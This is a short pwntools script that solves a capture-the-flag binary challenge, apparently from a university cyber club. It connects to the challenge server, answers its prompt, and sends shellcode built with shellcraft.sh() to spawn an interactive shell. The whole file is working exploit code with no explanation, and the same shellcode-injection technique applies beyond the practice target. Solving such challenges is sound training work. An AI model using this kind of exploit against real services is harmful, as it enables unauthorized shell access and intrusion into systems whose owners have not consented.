from pwn import *

EXE = ELF("./challenge/chall_6")

context.binary = EXE
context.terminal = ['xterm', '-e']
context.log_level = "DEBUG"

def conn(useExe=False):
	if useExe:
		# r = gdb.debug(EXE.path, "\n".join(breakpoints))
		r = process([EXE.path])
	else:
		r = remote('pwn.osucyber.club',13377)
	return r

io = conn(False)
# Wait for the process to send "Ever been to the Dreese Lab basement?" and respond to move on
io.recvuntil(b'"Ever been to the Dreese Lab basement?"')
io.send(b'no, i haven\'t\n')

# Create a payload with shellcode to spawn us a shell
payload = asm(shellcraft.sh())
payload += b'\n'
io.send(payload)
io.interactive()

io.close()